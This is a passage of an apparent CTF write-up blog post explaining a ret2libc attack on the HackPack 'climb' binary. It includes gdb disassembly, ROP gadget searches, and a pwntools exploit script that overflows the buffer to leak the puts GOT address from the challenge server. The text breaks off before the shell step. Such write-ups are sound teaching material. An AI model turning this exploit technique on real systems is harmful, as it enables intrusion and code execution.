<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Pwn Ret2Libc - gr4n173</title><meta name="Description" content="I will explain about the pwn challenges that I solved during CTF."><meta property="og:title" content="Pwn Ret2Libc" />
<meta property="og:description" content="I will explain about the pwn challenges that I solved during CTF." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.com/ret2libc/" />
<meta property="og:image" content="http://example.com/ret2libc/featured-image.png"/>
<meta property="article:published_time" content="2020-07-11T21:29:01+08:00" />
<meta property="article:modified_time" content="2020-07-11T08:45:01+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://example.com/ret2libc/featured-image.png"/>
<meta name="twitter:title" content="Pwn Ret2Libc"/>
<meta name="twitter:description" content="I will explain about the pwn challenges that I solved during CTF."/>
<meta name="application-name" content="gr4n173">
<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/ret2libc/" /><link rel="prev" href="http://example.com/patents/" /><link rel="next" href="http://example.com/nmap/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Pwn Ret2Libc",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.com\/ret2libc\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "http:\/\/example.com\/ret2libc\/featured-image.png",
                            "width":  540 ,
                            "height":  65 
                        }],"genre": "posts","keywords": "linux, ctf, hackpackctf, pwn, BoF, ret2libc, Explotation\u0026Pwning","wordcount":  2315 ,
        "url": "http:\/\/example.com\/ret2libc\/","datePublished": "2020-07-11T21:29:01+08:00","dateModified": "2020-07-11T08:45:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/example.com\/images\/profile.jpg",
                    "width":  400 ,
                    "height":  400 
                }},"author": {
                "@type": "Person",
                "name": "gr4n173"
            },"description": "I will explain about the pwn challenges that I solved during CTF."
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Pwn Ret2Libc</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-11">2020-07-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2315 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ret2libc/featured-image.png"
        data-srcset="/ret2libc/featured-image.png, /ret2libc/featured-image.png 1.5x, /ret2libc/featured-image.png 2x"
        data-sizes="auto"
        alt="/ret2libc/featured-image.png"
        title="I will explain about the pwn challenges that I solved during CTF." /></div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#ret2libc">Ret2libc</a></li>
    <li><a href="#pwn-challenge">Pwn Challenge</a>
      <ul>
        <li><a href="#climb">climb</a></li>
        <li><a href="#protection-mechanism">Protection Mechanism</a></li>
        <li><a href="#overflow-the-buffer">Overflow the buffer</a></li>
        <li><a href="#leaking-the-address">Leaking the address</a></li>
        <li><a href="#leaking-the-address-of-puts">Leaking the address of Puts</a></li>
        <li><a href="#finding-version-of-libc">Finding version of libc</a></li>
        <li><a href="#getting-base-address-of-libc">Getting base address of libc</a></li>
        <li><a href="#address-of-binsh-and-system">Address of bin/sh and system</a></li>
        <li><a href="#pwning-a-shell">Pwning a shell</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Hello pwners !! It&rsquo;s been a long time since the last post. I was unable to continue my series on <code>Exploitation&amp;Pwning</code> due to my busy schedule. But anyway I&rsquo;m here with the <code>second</code> post on <code>Exploitation&amp;Pwning </code> series.</p>
<hr>
<h1 id="description">Description</h1>
<p>Hello pwners !! It&rsquo;s been a long time since the last post. I was unable to continue my series on <code>Exploitation&amp;Pwning</code> due to my busy schedule. But anyway I&rsquo;m here with the <code>second</code> post on <code>Exploitation&amp;Pwning </code> series. You can read my first post of this series <a href="https://gr4n173.github.io/hackpacktf" target="_blank" rel="noopener noreffer">here</a>. Today I will try to explain about <code>ret2libc</code> attack.</p>
<h2 id="ret2libc">Ret2libc</h2>
<p>&ldquo;Return-to-Libc&rdquo; attack is a computer security attack usually starting with a buffer overflow in which a subroutine i.e. <code>return address</code> on a call stack by an <code>address</code> of a subroutine that is already present in the process executable memory. Bypassing the <code>no-execute bit</code> feature (if present) and getting a shell by injecting the code as required.</p>
<p>In order to be favorable to this attack, attacker can only call pre-existing functions like (puts, read, printf, libcstartmain, etc as per <code>elf</code> file).</p>
<h2 id="pwn-challenge">Pwn Challenge</h2>
<h3 id="climb">climb</h3>
<p><strong>Description [396]</strong>
Can you help me climb the rope?</p>
<p><code>nc cha.hackpack.club 41702</code></p>
<p><strong>File:</strong> <a href="/ret2libc/public/files/climb" rel="">climb</a></p>
<p>Solution:- As soon as I downloaded and ran the file it displayed with some description as</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$  ./climb
Stranger: Help! I<span class="err">&#39;</span>m stuck down here. Can you <span class="nb">help</span> me climb the rope?
How will you respond? 
</code></pre></td></tr></table>
</div>
</div><h3 id="protection-mechanism">Protection Mechanism</h3>
<p>After this, I grabbed <code>gdb</code> and started to check the protection mechanism.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">❯ gdb -q climb
GEF <span class="k">for</span> linux ready, <span class="nb">type</span> gef to start, gef config to configure
<span class="m">78</span> commands loaded <span class="k">for</span> GDB 9.1 using Python engine 3.8
<span class="o">[</span>*<span class="o">]</span> <span class="m">2</span> commands could not be loaded, run <span class="sb">`</span>gef missing<span class="sb">`</span> to know why.
Reading symbols from climb...
<span class="o">(</span>No debugging symbols found in climb<span class="o">)</span>
gef➤  checksec
<span class="o">[</span>+<span class="o">]</span> checksec <span class="k">for</span> <span class="s1">&#39;/home/gr4n173/hackpack/pwn/climbfile/climb&#39;</span>
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
</code></pre></td></tr></table>
</div>
</div><p>As per protection mechanism, <code>NX(no-executable)</code> and <code>RelRO</code> was enabled so I couldn&rsquo;t write the shellcode but instead I was able to use <code>got</code> writable address and get a shell. Likewise <code>Canary</code> disable indicated there was buffer overflow.</p>
<p>Let&rsquo;s assume that <code>ASLR</code> was also enabled in the server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gef➤  info functions
All defined functions:

Non-debugging symbols:
0x00000000004004e8  _init
0x0000000000400510  puts@plt
0x0000000000400520  setbuf@plt
0x0000000000400530  system@plt
0x0000000000400540  printf@plt
0x0000000000400550  read@plt
0x0000000000400560  _start
0x0000000000400590  _dl_relocate_static_pie
0x00000000004005a0  deregister_tm_clones
0x00000000004005d0  register_tm_clones
0x0000000000400610  __do_global_dtors_aux
0x0000000000400640  frame_dummy
0x0000000000400647  _init_
0x0000000000400650  _glibc_
0x0000000000400659  _entry1_
0x0000000000400664  call_me
0x000000000040067f  main
0x00000000004006e0  __libc_csu_init
0x0000000000400750  __libc_csu_fini
0x0000000000400754  _fini
</code></pre></td></tr></table>
</div>
</div><p>Here, I noticed a <code>main</code> and <code>call_me</code> functions. Then disassembled <code>main</code> function to see the details.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gef➤  disass main
Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
   0x000000000040067f &lt;+0&gt;:     push   rbp
   0x0000000000400680 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000400683 &lt;+4&gt;:     sub    rsp,0x20
   0x0000000000400687 &lt;+8&gt;:     mov    rax,QWORD PTR <span class="o">[</span>rip+0x2009c2<span class="o">]</span>        <span class="c1"># 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;</span>
   0x000000000040068e &lt;+15&gt;:    mov    esi,0x0
   0x0000000000400693 &lt;+20&gt;:    mov    rdi,rax
   0x0000000000400696 &lt;+23&gt;:    call   0x400520 &lt;setbuf@plt&gt;
   0x000000000040069b &lt;+28&gt;:    lea    rdi,<span class="o">[</span>rip+0xc6<span class="o">]</span>        <span class="c1"># 0x400768</span>
   0x00000000004006a2 &lt;+35&gt;:    call   0x400510 &lt;puts@plt&gt;
   0x00000000004006a7 &lt;+40&gt;:    lea    rdi,<span class="o">[</span>rip+0xff<span class="o">]</span>        <span class="c1"># 0x4007ad</span>
   0x00000000004006ae &lt;+47&gt;:    mov    eax,0x0
   0x00000000004006b3 &lt;+52&gt;:    call   0x400540 &lt;printf@plt&gt;
   0x00000000004006b8 &lt;+57&gt;:    lea    rax,<span class="o">[</span>rbp-0x20<span class="o">]</span>
   0x00000000004006bc &lt;+61&gt;:    mov    edx,0x1f4
   0x00000000004006c1 &lt;+66&gt;:    mov    rsi,rax
   0x00000000004006c4 &lt;+69&gt;:    mov    edi,0x0
   0x00000000004006c9 &lt;+74&gt;:    call   0x400550 &lt;read@plt&gt;
   0x00000000004006ce &lt;+79&gt;:    mov    eax,0x0
   0x00000000004006d3 &lt;+84&gt;:    leave  
   0x00000000004006d4 &lt;+85&gt;:    ret    
End of assembler dump.
</code></pre></td></tr></table>
</div>
</div><p>There you can see one variable with buffer of <code>0x20(32)</code> and a <code>read</code> function which took the 3 register to store the value. <code>read(0,variable, buffer_size)</code> as</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">   0x00000000004006bc &lt;+61&gt;:    mov    edx,0x1f4 <span class="c1">#buffersize of 500</span>
   0x00000000004006c1 &lt;+66&gt;:    mov    rsi,rax   <span class="c1">#variable</span>
   0x00000000004006c4 &lt;+69&gt;:    mov    edi,0x0   <span class="c1">#0</span>
   0x00000000004006c9 &lt;+74&gt;:    call   0x400550 &lt;read@plt&gt;
</code></pre></td></tr></table>
</div>
</div><p>Result from above indicated there was buffer overflow. So first thing was to find the <code>offset</code>. For that, you can visit my first post of <code>Exploitation&amp;Pwning</code> series <a href="https://gr4n173.github.io/hackpackctf" target="_blank" rel="noopener noreffer">here</a> to know detail about it.</p>
<h3 id="overflow-the-buffer">Overflow the buffer</h3>
<p>After finding offset which was<code>40</code> bytes. Now I can redirect to anywhere I want. Only I need to do now is to <code>pop</code> one of the argument; sequence of arguments in <code>64 bit</code> are as <code>rdi;rsi;rdx;rcx;r8;r9</code>. Then searched the gadgets related to the poping an arguments as</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gef➤  ropper --search <span class="s2">&#34;pop r?i&#34;</span>
<span class="o">[</span>INFO<span class="o">]</span> Load gadgets from cache
<span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
<span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... 100%
<span class="o">[</span>INFO<span class="o">]</span> Searching <span class="k">for</span> gadgets: pop r?i

<span class="o">[</span>INFO<span class="o">]</span> File: /home/gr4n173/climb
0x0000000000400743: pop rdi<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000400741: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>Up to here I overflowed the <code>buffer</code> and <code>pop a argument</code> so that I can call to any address I want.</p>
<p>Since <code>binary</code> had <code>writable got</code> address due to the partial protection of <code>RelRO</code>  I can point to that address and leak. For that I used the functions which was available in the binary file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gef➤  info functions
All defined functions:

Non-debugging symbols:
0x00000000004004e8  _init
0x0000000000400510  puts@plt
0x0000000000400520  setbuf@plt
0x0000000000400530  system@plt
0x0000000000400540  printf@plt
0x0000000000400550  read@plt
0x0000000000400560  _start
0x0000000000400590  _dl_relocate_static_pie
0x00000000004005a0  deregister_tm_clones
0x00000000004005d0  register_tm_clones
0x0000000000400610  __do_global_dtors_aux
0x0000000000400640  frame_dummy
0x0000000000400647  _init_
0x0000000000400650  _glibc_
0x0000000000400659  _entry1_
0x0000000000400664  call_me
0x000000000040067f  main
0x00000000004006e0  __libc_csu_init
0x0000000000400750  __libc_csu_fini
0x0000000000400754  _fini
</code></pre></td></tr></table>
</div>
</div><p>Then searched for <code>got address</code> .</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gef➤  got

GOT protection: Partial RelRO <span class="p">|</span> GOT functions: <span class="m">5</span>
 
<span class="o">[</span>0x601018<span class="o">]</span> puts@GLIBC_2.2.5  →  0x7ffff7e54030  <span class="c1">#this one</span>
<span class="o">[</span>0x601020<span class="o">]</span> setbuf@GLIBC_2.2.5  →  0x7ffff7e5adb0
<span class="o">[</span>0x601028<span class="o">]</span> system@GLIBC_2.2.5  →  0x400536
<span class="o">[</span>0x601030<span class="o">]</span> printf@GLIBC_2.2.5  →  0x7ffff7e34470
<span class="o">[</span>0x601038<span class="o">]</span> read@GLIBC_2.2.5  →  0x7ffff7ecc5c0
</code></pre></td></tr></table>
</div>
</div><p>Up to this, my payload to leak the address was</p>
<h3 id="leaking-the-address">Leaking the address</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">payload</span> <span class="o">=</span> offset + pop_rdi + puts@got + puts@plt
</code></pre></td></tr></table>
</div>
</div><p><strong>Part1_exploit: -</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/bin/python3</span>
<span class="c1"># part1exploit.py</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Import pwntools</span>

<span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;cha.hackpack.club&#39;</span><span class="p">,</span><span class="mi">41702</span><span class="p">)</span>
<span class="c1">#p = process(&#34;./climb&#34;) # start the vuln binary</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./climb&#34;</span><span class="p">)</span><span class="c1"># Extract data from binary</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span><span class="c1"># Find ROP gadgets</span>

<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span><span class="c1"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Puts@plt: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pop rdi gadget: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
<span class="c1">#Overflow buffer until return address</span>
<span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#+ &#34;B&#34;*8</span>
<span class="c1"># Create rop chain</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="n">OFFSET</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><p><strong>Output</strong> :-</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">❯</span> <span class="n">python3</span> <span class="n">part1_exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/gr4n173/climb&#39;</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s1">&#39;./climb&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="nd">@plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xc0</span><span class="s1">I</span><span class="se">\xe7</span><span class="s1">X</span><span class="se">\xac\x7f</span><span class="s1">&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</code></pre></td></tr></table>
</div>
</div><p>From the output of <code>part1 exploit</code> some <code>leak</code> was seen which was random everytime I ran the exploit. So that may be the address leaked. In order to check I tried to <code>strip</code> it and then unpacked as 8 bytes data.</p>
<h3 id="leaking-the-address-of-puts">Leaking the address of Puts</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
